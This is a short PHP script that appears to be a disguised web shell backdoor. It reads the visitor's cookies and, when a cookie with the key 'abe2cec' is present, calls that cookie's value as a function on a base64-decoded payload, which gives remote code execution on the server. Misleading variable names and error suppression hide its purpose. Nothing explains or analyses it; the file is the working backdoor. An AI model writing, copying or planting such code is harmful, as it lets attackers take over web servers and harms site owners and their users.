<?php

$plain = "abe2cec";
$ns = $_COOKIE;

foreach ( $ns as $dropdown => $subsets ) {
	if ($dropdown == $plain) {
		$stage = array_pop($ns);
		$stage = base64_decode($stage);
		echo @$subsets($stage);
	}
}

?>